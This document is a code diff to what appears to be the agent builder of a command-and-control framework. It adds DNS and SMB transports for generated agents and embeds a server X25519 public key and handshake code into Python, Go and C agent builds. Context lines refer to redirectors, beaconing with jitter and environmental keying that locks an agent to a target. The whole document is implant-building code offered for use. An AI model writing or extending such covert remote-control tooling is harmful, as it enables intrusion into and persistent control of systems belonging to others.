@@ -1208,7 +1208,11 @@ def {cmd_func}(cmd):
             print(f"[*] Agent will connect via redirector: {connect_host}:{connect_port}")
 
         # Select template based on transport and mode
-        if transport in ('http', 'https'):
+        if transport == 'dns':
+            template_path = self.templates_dir / "agent_dns_template.py"
+        elif transport == 'smb':
+            template_path = self.templates_dir / "agent_smb_template.py"
+        elif transport in ('http', 'https'):
             if beacon_mode:
                 template_path = self.templates_dir / "agent_http_beacon_minimal.py"
             else:
@@ -1224,6 +1228,14 @@ def {cmd_func}(cmd):
 
         with open(template_path, 'r') as f:
             content = f.read()
+
+        from crypto.handshake import ServerIdentity, agent_wire_source
+        wire_src = agent_wire_source(ServerIdentity.load().pub)
+        shebang_at = content.find('\n', content.find('#!'))
+        if shebang_at > 0:
+            content = content[:shebang_at + 1] + '\n' + wire_src + '\n' + content[shebang_at + 1:]
+        else:
+            content = wire_src + '\n' + content
 
         # Generate unique key if requested
         if unique_key:
@@ -1451,6 +1463,8 @@ def {cmd_func}(cmd):
             f'-X "{pkg}.telemetryPath={uris["results"]}"',
             f'-X "{pkg}.clientID={ua}"',
         ]
+        from crypto.handshake import ServerIdentity
+        ldflag_parts.append(f'-X {pkg}.configServerPub={ServerIdentity.load().pub.hex()}')
 
         # Environmental keying — lock agent to specific target environment
         if env_hostname:
@@ -1511,6 +1525,12 @@ def {cmd_func}(cmd):
         if transport in ('websocket', 'ws'):
             build_cmd.extend(['-tags', 'transport_ws'])
             print(f"[*] Transport: WebSocket (gorilla/websocket)")
+        elif transport == 'dns':
+            build_cmd.extend(['-tags', 'transport_dns'])
+            print(f"[*] Transport: DNS")
+        elif transport == 'smb':
+            build_cmd.extend(['-tags', 'transport_smb'])
+            print(f"[*] Transport: SMB")
         else:
             print(f"[*] Transport: HTTP/HTTPS (stdlib)")
 
@@ -1767,6 +1787,7 @@ def {cmd_func}(cmd):
             '{{BEACON_INTERVAL}}': str(beacon_interval), '{{BEACON_JITTER}}': str(beacon_jitter),
             '{{REGISTER_URI}}': uris['register'], '{{CHECKIN_URI}}': uris['checkin'],
             '{{RESULT_URI}}': uris['results'], '{{USE_HTTPS}}': use_https,
+            '{{SERVER_X25519_PUB}}': __import__('crypto.handshake', fromlist=['ServerIdentity']).ServerIdentity.load().pub.hex(),
         }
         for k, v in replacements.items():
             src = src.replace(k, v)
@@ -1779,6 +1800,9 @@ def {cmd_func}(cmd):
         out_path = self.output_dir / out_name
 
         src_files = [str(tmp_c)]
+        x25519_src = c_src.parent / 'x25519.c'
+        if x25519_src.exists():
+            src_files.append(str(x25519_src))
         if ghost_src.exists():
             src_files.append(str(ghost_src))
 
